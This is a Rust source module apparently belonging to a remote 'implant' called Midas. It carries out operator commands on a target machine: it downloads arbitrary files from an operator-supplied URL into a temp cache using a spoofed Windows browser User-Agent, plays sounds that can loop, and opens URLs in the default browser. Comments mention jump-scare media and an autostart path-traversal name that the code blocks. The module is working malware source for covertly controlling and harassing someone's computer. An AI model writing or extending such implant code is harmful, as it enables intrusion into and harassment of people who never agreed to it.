//! Side effects that are not overlay windows: file retrieval, sound, URLs.

use std::io::Read;
use std::path::PathBuf;

/// Upper bound on a download. Large enough for a wallpaper or a jump-scare
/// video frame, small enough that a mistyped URL cannot fill the disk.
const MAX_DOWNLOAD: u64 = 32 * 1024 * 1024;

/// Downloads `url` into the implant's cache directory and returns the path.
///
/// Only the final path component of `filename` is honoured. Without that, a
/// name like `../../.config/autostart/evil` would write outside the cache -
/// this is the only place Midas turns operator input into a filesystem path.
pub fn fetch(url: &str, filename: &str) -> Result<String, String> {
    if !url.starts_with("http://") && !url.starts_with("https://") {
        return Err("URL must start with http:// or https://".into());
    }

    let safe_name = sanitise_name(filename)?;
    let mut destination = cache_dir()?;
    destination.push(&safe_name);

    if let Some(parent) = destination.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| format!("could not create {}: {e}", parent.display()))?;
    }

    let response = ureq::get(url)
        .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .call()
        .map_err(|e| format!("GET {url} failed: {e}"))?;

    let mut body = Vec::new();
    response
        .into_reader()
        .take(MAX_DOWNLOAD)
        .read_to_end(&mut body)
        .map_err(|e| format!("could not read the response body: {e}"))?;

    if body.is_empty() {
        return Err("the response was empty".into());
    }

    std::fs::write(&destination, &body)
        .map_err(|e| format!("could not write {}: {e}", destination.display()))?;

    Ok(destination.to_string_lossy().into_owned())
}

/// Strips any directory component from a caller-supplied name.
fn sanitise_name(filename: &str) -> Result<String, String> {
    let base = filename
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or_default()
        .trim();

    if base.is_empty() {
        return Err("filename is empty once directories are stripped".into());
    }

    if base == "." || base == ".." || base.contains('\0') {
        return Err("filename is not a usable file name".into());
    }

    Ok(base.to_string())
}

fn cache_dir() -> Result<PathBuf, String> {
    let base = std::env::temp_dir();
    let dir = base.join("midas");

    std::fs::create_dir_all(&dir).map_err(|e| format!("could not create {}: {e}", dir.display()))?;
    Ok(dir)
}

/// Plays a sound with `PlaySoundW`.
///
/// The call is asynchronous, so a looping sound does not need a worker thread of
/// its own, and it is the only player this implant uses.
pub fn play_sound(path: &str, looping: bool) -> Result<(), String> {
    crate::gui::win::play_sound(path, looping)
}

/// Opens a URL in the default browser. `background` is accepted for interface
/// symmetry with the command schema; `ShellExecuteW` with `SW_SHOWNORMAL`
/// returns as soon as the browser is launched, so the call never blocks.
pub fn open_url(url: &str, _background: bool) -> Result<(), String> {
    if !url.starts_with("http://")
        && !url.starts_with("https://")
        && !url.starts_with("mailto:")
    {
        return Err("only http, https and mailto URLs are opened".into());
    }

    crate::gui::win::open_url(url)
}
